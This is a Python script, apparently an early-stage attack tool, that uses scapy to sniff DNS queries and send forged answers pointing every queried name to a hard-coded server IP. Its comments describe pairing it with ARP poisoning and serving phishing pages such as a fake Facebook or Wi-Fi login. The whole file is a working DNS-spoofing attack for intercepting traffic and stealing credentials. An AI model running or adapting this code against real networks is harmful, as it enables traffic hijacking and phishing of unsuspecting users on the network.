from scapy.all import DNS, DNSQR, IP, send, IPv6, sr, UDP, sniff, DNSRR, sendp
import threading
import random
import argparse

SPOOFED_SERVER_IP = "34.204.64.214" # soch3d # change to get our sys ip
#SPOOFED_SERVER_IP = "127.0.0.1" # change to get our sys ip
DNS_FILTER = "udp port 53"
SPOOFED_SITE = [b'www.resonous.com.']	#192.168.1.5

# SNIFF DNS reqs
	# for now use arp
	# either try to sniff all or use arp poisoner
# send spoofed resp pointing to our web server
# webserver returns phishing page (for now resonous.com)
	# either dynamically generate the website
	# or only spoof a predetermined webpage (facebook)
	# or show a fake wifi login page

def dns_spoofer(pkt):

	if (pkt.haslayer(DNS) and
		pkt[DNS].qr == 0 and				# DNS Query
		pkt[DNS].opcode == 0 and			# DNS Standard Query
		pkt[DNS].ancount == 0				# Answer Count
		#pkt[DNS].qd.qname in SPOOFED_SITE	# Query domain name
		):

		print("Sending spoofed DNS response")

		if (pkt.haslayer(IPv6)):
			ip_layer = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
		else:
			ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)


		# Create the spoofed DNS response (returning back our IP as answer instead of the endpoint)
		dns_resp =  ip_layer/ \
					UDP(
						dport=pkt[UDP].sport,
						sport=53
						)/ \
					DNS(
						id=pkt[DNS].id,					# Same as query
						ancount=1,						# Number of answers
						qr=1,							# DNS Response
						ra=1,							# Recursion available
						qd=(pkt.getlayer(DNS)).qd,		# Query Data
						an=DNSRR(
							rrname=pkt[DNSQR].qname,	# Queried host name
							rdata=SPOOFED_SERVER_IP,	# IP address of queried host name
							ttl = 10
							)
						)

		# Send the spoofed DNS response
		print(dns_resp.show())
		send(dns_resp, verbose=0)
		print(f"Resolved DNS request for {pkt[DNS].qd.qname} by {SPOOFED_SERVER_IP}")
	else:
		return

def main():
	print("Sniffing Packets")
	sniff(filter=DNS_FILTER, prn=dns_spoofer)


if __name__ == "__main__":
	main()


#DNSRR(rrname=SPOOFED_SITE,rdata=SPOOFED_SERVER_IP))
#DNSRR(rrname=SPOOFED_SITE,rdata=SPOOFED_SERVER_IP))

